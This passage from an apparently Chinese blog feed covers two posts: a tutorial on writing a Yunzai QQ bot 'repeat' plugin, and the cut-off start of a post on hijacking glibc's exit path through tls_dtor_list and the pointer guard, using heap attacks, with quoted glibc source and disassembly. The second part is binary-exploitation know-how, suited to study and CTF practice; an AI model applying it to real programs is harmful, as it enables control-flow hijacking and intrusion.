class="punctuation">,</span></span><br><span class="line">    getGroupMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupMemberMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMemberMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    gl<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    gml<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Map<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    request_list<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getSystemMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getSystemMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setFriendAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setFriendAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setGroupAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setGroupAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    cookies<span class="punctuation">:</span> <span class="punctuation">&#123;</span> &#x27;aq.qq.com&#x27;<span class="punctuation">:</span> undefined <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    getCookies<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCookies<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getCsrfToken<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCsrfToken<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    guild_info<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    clients<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">    version<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      app_name<span class="punctuation">:</span> &#x27;Lagrange.OneBot&#x27;<span class="punctuation">,</span></span><br><span class="line">      app_version<span class="punctuation">:</span> &#x27;<span class="number">0.0</span><span class="number">.3</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      protocol_version<span class="punctuation">:</span> &#x27;v11&#x27;<span class="punctuation">,</span></span><br><span class="line">      nt_protocol<span class="punctuation">:</span> &#x27;Linux | <span class="number">3.2</span><span class="number">.10</span><span class="number">-25765</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      version<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    bkn<span class="punctuation">:</span> <span class="number">202881165</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  group_name<span class="punctuation">:</span> &#x27;testbot、collec...&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">  reply<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logText<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">36</span>m<span class="punctuation">[</span>testbot、collec...(<span class="number">1003519385</span>)<span class="punctuation">,</span> collectcrop(<span class="number">2583727188</span>)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m\x1B<span class="punctuation">[</span><span class="number">31</span>m<span class="punctuation">[</span>#复读<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;<span class="punctuation">,</span></span><br><span class="line">  isGroup<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  recall<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> bound recallMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  isMaster<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  runtime<span class="punctuation">:</span> Runtime <span class="punctuation">&#123;</span></span><br><span class="line">    e<span class="punctuation">:</span> <span class="punctuation">[</span>Circular *<span class="number">1</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    _mysInfo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    handler<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      has<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> has<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      call<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> call<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      callAll<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> callAll<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  original_msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logFnc<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">34</span>m<span class="punctuation">[</span>复读(repeat)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<h6 id="核心信息"><strong>核心信息</strong></h6>
<ul>
<li><strong><code>message_type</code></strong>: 表示消息类型。
<ul>
<li><code>"group"</code>: 群聊消息。</li>
<li><code>"private"</code>: 私聊消息。</li>
</ul></li>
<li><strong><code>sub_type</code></strong>: 子类型。
<ul>
<li>对于群聊消息，常见值是 <code>"normal"</code>，表示普通消息。</li>
</ul></li>
<li><strong><code>message_id</code></strong>: 消息
ID，可用于引用或撤回这条消息。</li>
<li><strong><code>group_id</code></strong>: 群号，仅当消息类型是
<code>"group"</code> 时存在。</li>
<li><strong><code>user_id</code></strong>: 发送者的 QQ 号。</li>
<li><strong><code>message</code></strong>:
消息的具体内容，数组形式，每个元素是一个对象，表示消息的组成部分。
<ul>
<li><strong>示例</strong>:
<code>[ &#123; text: '#复读', type: 'text' &#125; ]</code></li>
</ul></li>
<li><strong><code>raw_message</code></strong>:
消息的原始内容，字符串形式。
<ul>
<li><strong>示例</strong>: <code>"#复读"</code></li>
</ul></li>
<li><strong><code>sender</code></strong>: 发送者信息，包含以下字段：
<ul>
<li><code>user_id</code>: 发送者 QQ 号。</li>
<li><code>nickname</code>: 昵称。</li>
<li><code>card</code>: 群名片。</li>
<li><code>sex</code>: 性别，值可能是
<code>"male"</code>、<code>"female"</code> 或
<code>"unknown"</code>。</li>
<li><code>level</code>: 群等级。</li>
<li><code>role</code>: 群内角色，可能是
<code>"owner"</code>（群主）、<code>"admin"</code>（管理员）或
<code>"member"</code>（普通成员）。</li>
</ul></li>
</ul>
<hr />
<h6 id="扩展信息"><strong>扩展信息</strong></h6>
<ul>
<li><strong><code>self_id</code></strong>: 机器人的 QQ 号。</li>
<li><strong><code>post_type</code></strong>: 事件类型。
<ul>
<li><code>"message"</code>: 消息事件。</li>
</ul></li>
<li><strong><code>time</code></strong>: 发送时间的时间戳（Unix
时间）。</li>
<li><strong><code>isGroup</code></strong>:
布尔值，表示消息是否来自群聊。</li>
<li><strong><code>isMaster</code></strong>:
布尔值，表示发送者是否为插件配置的主人。</li>
</ul>
<hr />
<h6 id="事件上下文管理"><strong>事件上下文管理</strong></h6>
<ul>
<li><code>runtime</code>: 插件运行时信息。
<ul>
<li><code>runtime.e</code>: 当前事件对象（即 <code>this.e</code>
本身）。</li>
<li>其他属性用于管理事件处理流程。</li>
</ul></li>
</ul>
<h5 id="reply函数实现">reply函数实现</h5>
<p>同样的方式，用<code>console.log(this.e.reply.toString());</code>，能动态查看这个reply函数的源码。然后再在vscode里搜索一下，最后在loader.js中找到了对应代码。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">e.<span class="property">reply</span> = <span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> &#123; recallMsg = <span class="number">0</span>, at = <span class="string">&quot;&quot;</span> &#125; = data</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">          at = e.<span class="property">user_id</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> res</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">        res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<h6 id="函数参数">函数参数</h6>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><code>msg</code>: 要发送的消息，默认值是空字符串。</p></li>
<li><p><code>quote</code>:
是否引用消息（通常用于回复特定消息），默认值为
<code>false</code>。</p></li>
<li><p><code>data</code>: 一个对象，包含额外的选项，包括：</p>
<ul>
<li><code>recallMsg</code>: 是否自动撤回消息，单位是秒（默认值为
<code>0</code>，即不撤回）。</li>
<li><code>at</code>: 是否 @ 某人。可以是用户 ID，也可以是
<code>true</code>（表示 @ 当前消息发送者）。</li>
</ul></li>
</ul>
<hr />
<h6 id="at-和-quote-功能的处理"><strong><code>at</code> 和
<code>quote</code> 功能的处理</strong></h6>
<p><strong>@ 功能 (<code>at</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">    at = e.<span class="property">user_id</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果传入了 <code>at</code>且当前消息是群消息：</p>
<ul>
<li>如果 <code>at === true</code>，则默认 @ 当前用户
<code>e.user_id</code>。</li>
<li>如果消息内容是数组，会在数组前添加 <code>@</code>
信息和换行符。</li>
<li>如果消息是普通文本，则将消息包装成一个数组并加上 <code>@</code>
信息。</li>
</ul></li>
</ul>
<hr />
<p><strong>引用消息 (<code>quote</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果 <code>quote</code>为<code>true</code>且当前事件中有
<code>message_id</code>：</p>
<ul>
<li>在消息前添加一段引用内容（<code>segment.reply(e.message_id)</code>）。</li>
<li>类似 <code>at</code> 的逻辑，会将消息转换为数组格式。</li>
</ul></li>
</ul>
<hr />
<h6 id="消息发送与异常处理"><strong>消息发送与异常处理</strong></h6>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">  res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>使用 <code>reply(msg)</code> 发送消息。</li>
<li>如果发送失败，会捕获异常，并通过 <code>Bot.makeLog</code>
记录错误日志。</li>
</ul>
<hr />
<h6 id="自动撤回消息"><strong>自动撤回消息</strong></h6>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果 <code>recallMsg</code> 大于 0
且成功发送了消息（<code>res?.message_id</code>存在）：</p>
<ul>
<li>如果消息是在群聊中发送，调用 <code>e.group.recallMsg</code>
撤回消息。</li>
<li>如果消息是在私聊中发送，调用 <code>e.friend.recallMsg</code>
撤回消息。</li>
<li><code>setTimeout</code> 用来延迟 <code>recallMsg</code>
秒后执行撤回操作。</li>
</ul></li>
</ul>
<hr />
<h6 id="统计与返回"><strong>统计与返回</strong></h6>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></div>
<ul>
<li>调用 <code>this.count</code>
方法统计消息发送（如记录发送次数）。</li>
<li>最后返回消息发送的结果 <code>res</code>。</li>
</ul>
<p>这样我们就可以尝试着手实现一个简单的功能改造了，这个自带的复读文件需要我们输入<code>#复读</code>，然后bot回应后我们再输入内容，bot才会复读该内容。那么我们可以尝试将其改造成一个我们@bot后输入复读xxx，然后bot复读xxx的一个功能插件。</p>
<p>在更改的过程中发现了一个严峻的问题，就是其rule中reg的正则匹配只返回了true或false，但并不能捕获分组。这里我们可以在函数体内部再进行一次正则表达的匹配，然后进行输出。</p>
<p>在测试中也发现，我们@bot的这个前缀实际不会出现在e.msg中，只用匹配后面的内容就行。</p>
<p>最终更改结果：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^复读:(.*)$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;all&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  repeat = <span class="title function_">async</span> () =&gt;&#123;</span><br><span class="line">    <span class="comment">// const content = this.e.match[1].trim();</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">rule</span>); <span class="comment">// 打印 this.rule 的值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">rule</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>] &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span> = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>);</span><br><span class="line">      <span class="keyword">const</span> match = <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>.<span class="title function_">exec</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">msg</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(match);</span><br><span class="line">      <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        <span class="keyword">const</span> content = match[<span class="number">1</span>].<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(content, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;No match found&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;rule or reg is undefined&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>qqbot</category>
      </categories>
      <tags>
        <tag>yunzai</tag>
        <tag>JS</tag>
        <tag>OneBot</tag>
      </tags>
  </entry>
  <entry>
    <title>tls_dtor_list劫持exit执行-高版本glibc利用思路之一</title>
    <url>/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/</url>
    <content><![CDATA[<h4 id="利用原理">利用原理</h4>
<p>主要链条：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</span><br></pre></td></tr></table></figure></div>
<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ THREAD_GET_POINTER_GUARD ())</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GET_POINTER_GUARD() \</span></span><br><span class="line"><span class="meta">  THREAD_GETMEM (THREAD_SELF, header.stack_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GETMEM(descr, member) \</span></span><br><span class="line"><span class="meta">  descr-&gt;member</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>很清楚能看到如果<code>tls_dtor_list</code>不为空，就会把cur指针指向<code>tls_dtor_list</code>，然后将其中func的函数指针字段经过<code>PTR_DEMANGLE</code>处理后，直接作为函数调用，参数是<code>cur-&gt;obj</code>。</p>
<p><code>tls_dtor_list</code>记录了<code>dtor_list</code>这个单向链表的表头，我们可以通过覆盖<code>tls_dtor_list</code>的值为一个我们可控的内存区域，然后就能伪造各个字段了。但最麻烦的是在调用func前有一个异或的逻辑，实际上会与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>处的内容进行异或，那我们首先要想办法泄露出这个内容，或者是直接改写这个位置的内容，才可以调用我们想要的函数。所以一般会利用largebin
attack或者unsortedbin
attack两次，完成<code>tls_dtor_list</code>的修改以及对<code>tcbhead_t-&gt;pointer_guard</code>的修改。</p>
<h4 id="汇编实现">汇编实现</h4>
<p>主要逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;__call_tls_dtors+<span class="number">17</span>&gt;    mov    rbp, qword ptr fs:[rbx]             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">21</span>&gt;    test   rbp, rbp                            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">24</span>&gt;    je     __call_tls_dtors+<span class="number">93</span>         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">26</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">32</span>&gt;    mov    rdx, qword ptr [rbp + <span class="number">0x18</span>]         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">36</span>&gt;    mov    rax, qword ptr [rbp]                </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">40</span>&gt;    ror    rax, <span class="number">0x11</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="number">0x30</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">53</span>&gt;    mov    qword ptr fs:[rbx], rdx             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">57</span>&gt;    mov    rdi, qword ptr [rbp + <span class="number">8</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">61</span>&gt;    call   rax    </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">63</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x10</span>]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">67</span>&gt;    lock sub qword ptr [rax + <span 